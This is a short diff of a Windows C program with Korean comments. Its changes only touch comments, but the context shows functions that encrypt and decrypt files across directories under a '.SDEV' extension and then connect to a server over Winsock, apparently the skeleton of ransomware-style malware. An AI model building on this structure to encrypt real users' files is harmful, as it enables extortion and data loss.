@@ -253,10 +253,9 @@ void EncryptTarget(target* t, unsigned char* key) {
 
     FindClose(hFind);
 }
-
 // -----------------------------------------------------------------------
 // 복호화 대상 디렉터리 순회
-// .SDEV 제거 → 원본 파일명 복원  (예: photo.png.SDEV → photo.png)
+// .SDEV 제거 → 원본 파일명 복원
 // -----------------------------------------------------------------------
 void DecryptTarget(target* t, unsigned char* key) {
     wchar_t searchPath[1000];
@@ -308,7 +307,7 @@ void DecryptTarget(target* t, unsigned char* key) {
 }
 
 // -----------------------------------------------------------------------
-// main
+// main함수~
 // -----------------------------------------------------------------------
 int main() {
     setlocale(LC_ALL, "Korean");
@@ -341,7 +340,7 @@ int main() {
         CreateDirectoryW(subDir, NULL);
     }
 
-    // ── Winsock / 서버 연결 ──────────────────────────────────────────────
+    //Winsock / 서버 연결
     WSADATA wsaData = { 0 };
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         fprintf(stderr, "WSAStartup failed.\n");
